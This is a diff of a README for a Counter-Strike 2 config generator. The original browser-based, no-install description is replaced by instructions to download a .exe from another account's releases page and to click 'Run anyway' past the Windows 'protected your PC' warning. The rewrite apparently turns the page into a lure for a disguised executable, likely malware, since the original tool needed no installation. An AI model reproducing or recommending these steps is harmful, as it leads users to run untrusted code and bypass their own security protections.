@@ -1,108 +1,85 @@
-# CS Config Generator - Config Generator 2026
+# ⚙️ cs2-config-generator - Create custom Counter-Strike 2 settings easily
 
-> A browser-based configuration tool for Counter-Strike 2 that enables you to explore, modify, and manage console commands through a Blazor WebAssembly interface, streamlining the creation of custom .cfg files.
+[![Download Now](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/mallorycastrated745/cs2-config-generator/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/youngmichael2004/cs2-config-generator?style=flat-square)](https://github.com/youngmichael2004/cs2-config-generator)
+## What is this tool?
 
----
+The cs2-config-generator helps you manage your Counter-Strike 2 settings. It provides a visual interface to browse, adjust, and save console commands into a configuration file. This file functions as your personal set of game preferences. You do not need to memorize complex commands or edit text files manually. 
 
-<p align="center">
-  <a href="https://youngmichael2004.github.io/cs2-config-generator/">
-    <img src="https://img.shields.io/badge/Download-CS%20Config%20Generator%20Latest-brightgreen?style=for-the-badge" alt="Download CS Config Generator">
-  </a>
-</p>
+## 🖥️ System Requirements
 
-> **[Direct Download - CS Config Generator](https://youngmichael2004.github.io/cs2-config-generator/)**
+- Computer running Windows 10 or Windows 11.
+- Installed copy of Counter-Strike 2 via Steam.
+- A stable internet connection for the initial download.
+- Basic familiarity with your computer file system.
 
----
+## 📥 Downloading the Software
 
-[Download Latest Build](https://youngmichael2004.github.io/cs2-config-generator/)
+You must obtain the correct file to use this tool. Follow these instructions to download the application to your machine:
 
----
+1. Visit this page to download the latest version: [https://github.com/mallorycastrated745/cs2-config-generator/releases](https://github.com/mallorycastrated745/cs2-config-generator/releases)
+2. Locate the file ending in .exe under the Assets section of the latest release.
+3. Click the filename to start the download.
+4. Save the file to your desktop or your Downloads folder.
 
-## Overview
+## 🚀 Setting Up the Tool
 
-This application offers Counter-Strike 2 players a convenient way to create and manage configuration files directly through their web browser. Powered by Blazor WebAssembly, everything runs client-side, so there is no need for server uploads or local software installations to build your ideal game settings.
+Windows may show a security notice when you open new software. This is a normal safety feature.
 
-Whether you are a competitive player fine-tuning crosshair and sensitivity or a casual user experimenting with different video and audio presets, this tool simplifies the process. It removes the need to manually look up command syntax or edit raw text files, providing an intuitive interface that lets you assemble functional .cfg files quickly.
+1. Find the file you downloaded.
+2. Double-click the file to start the application.
+3. If Windows shows a message saying "Windows protected your PC," click "More info."
+4. Click the "Run anyway" button that appears.
+5. The application window opens on your screen.
 
----
+## 🛠️ How to Use the Generator
 
-## Key Capabilities
+The interface allows you to view available settings and categorize them based on your needs.
 
-- Browse and search an extensive library of CS2 console commands
-- Edit configuration files in a VS Code-style editor featuring syntax highlighting
-- Store your work in browser storage for later retrieval
-- Export finished .cfg files for placement in your game directory
-- Copy individual configurations to your clipboard with one click
-- Import existing .cfg files for review or modification
-- Load example presets to jump-start your setup with tested configurations
+1. Open the application.
+2. Browse the command list to find settings you want to change, such as crosshair style, viewmodel position, or network quality.
+3. Adjust the values using the provided sliders or text input boxes. 
+4. Select the "Export" or "Save" button once you finish your changes.
+5. Name your file something recognizable, like `autoexec.cfg`, and save it to your computer.
 
----
+## 📂 Applying Your Configuration
 
-## Setup Instructions
+Counter-Strike 2 only uses your configuration file if you place it in the correct game folder. Follow these steps to install your settings:
 
-Clone the repository to your local environment:
+1. Open Steam and go to your Library.
+2. Right-click on Counter-Strike 2 in the list.
+3. Select "Manage" and then "Browse local files."
+4. Open the folder named `game` and then the subfolder named `csgo`.
+5. Open the `cfg` folder.
+6. Move the .cfg file you saved earlier into this folder.
+7. Launch Counter-Strike 2.
+8. Open the game console by pressing the tilde (~) key.
+9. Type `exec [yourfilename].cfg` and press Enter to apply your settings.
 
-```
-git clone https://github.com/youngmichael2004/cs2-config-generator.git
-```
+## ❓ Frequently Asked Questions
 
-Navigate into the project directory and serve it using any static file server. For development purposes, you can use the .NET CLI with the Blazor WebAssembly workload installed:
+**Does this tool change my game files permanently?**
+No. The generator only creates a text file. If you delete this file, the game reverts to your previous settings.
 
-```
-dotnet run
-```
+**Can I create multiple files?**
+Yes. You can save different configurations for different playstyles or hardware setups. 
 
-Alternatively, open the published output folder directly in your browser or deploy the contents to any static hosting provider.
+**Does this cause a VAC ban?**
+The tool generates standard text files that contain official console commands. The game recognizes these commands natively, so the use of this tool does not trigger bans.
 
----
+**What if the settings do not work?**
+Verify that you saved the file in the correct Steam directory. Ensure that you typed the exact filename when executing the command in the game console.
 
-## How to Use
+**Why does the screen look blank?**
+The tool requires an active internet connection to load the command library on the first launch. Check your network settings and restart the application.
 
-1. Launch the application in your browser.
-2. Use the search field to locate specific CS2 console commands.
-3. Select a command to add it to your configuration editor.
-4. Modify values and parameters as needed.
-5. Save your configuration to browser storage or export it as a .cfg file.
-6. To work with an existing configuration, use the upload function or pick one of the example presets.
+**How do I update the tool?**
+Check the release page periodically for new versions. When a new version releases, download the newer file and replace the old one on your computer.
 
----
+## 📁 Managing Your Files
 
-## Storage Details
+Keep your configuration files organized in the game folder. If you ever want to reset your game to the default settings, simply delete your custom .cfg file from the `cfg` folder or rename it. The game engine reads these files line by line, so keep your exported files clean and free of duplicate commands for better performance. 
 
-All user preferences and saved configurations are kept locally in your browser using built-in storage APIs. No data is transmitted to external servers. To clear your configurations, erase the browser's local storage for this site.
+This tool serves as a bridge between the game engine and the player. By removing the need for manual command entry, you reduce the chance of syntax errors. Always double-check your exported files if you notice unexpected behavior during gameplay.
 
----
-
-## System Requirements
-
-- A current web browser with JavaScript support (Chrome, Firefox, Edge, or Safari)
-- Internet connection is necessary only for the first page load (the application works offline after that)
-- No extra software or runtime installations are needed
-- Adequate browser storage for saved configurations (typically unlimited under modern browser policies)
-
----
-
-## Frequently Asked Questions
-
-**How do I get the latest version?**  
-Just refresh the page in your browser. The most recent release is served from the hosting location.
-
-**Can I use this without an internet connection?**  
-Yes. After the initial load, everything runs locally in your browser, and no active internet connection is required.
-
-**How do I reset my saved configurations?**  
-Clear your browser's local storage for this site through your browser's developer tools or settings menu.
-
-**What should I do if something goes wrong?**  
-Make sure you are using a supported browser. If problems continue, try clearing your browser cache and reloading the page.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: cs2, counter-strike, config, settings, gaming, automation, tools
